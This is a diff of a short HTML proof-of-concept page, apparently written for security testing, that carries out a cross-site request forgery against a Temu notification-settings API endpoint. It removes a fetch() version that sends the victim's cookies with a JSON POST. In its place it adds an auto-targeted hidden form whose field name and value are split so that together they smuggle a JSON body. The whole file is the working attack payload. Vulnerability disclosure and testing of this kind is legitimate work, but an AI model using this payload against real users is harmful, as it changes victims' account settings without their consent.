@@ -1,24 +1,10 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h3>Click to trigger JSON CSRF request</h3>
-    <button onclick="sendCSRF()">Send CSRF</button>
-
-    <script>
-      function sendCSRF() {
-        fetch("https://www.temu.com/api/bg-barbera-api/setting/notification/configure", {
-          method: "POST",
-          credentials: "include",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({ id: 100, status: 1 })
-        }).then(res => {
-          console.log("Request sent. Status:", res.status);
-        }).catch(err => {
-          console.error("CSRF request blocked:", err);
-        });
-      }
-    </script>
+    <h3>Manual CSRF PoC - POST to Temu Notification Configure</h3>
+    <form action="https://www.temu.com/api/bg-barbera-api/setting/notification/configure" method="POST" target="_blank">
+      <input type="hidden" name='{"id"' value='100,"status":1}'>
+      <input type="submit" value="Submit CSRF Request">
+    </form>
   </body>
 </html>
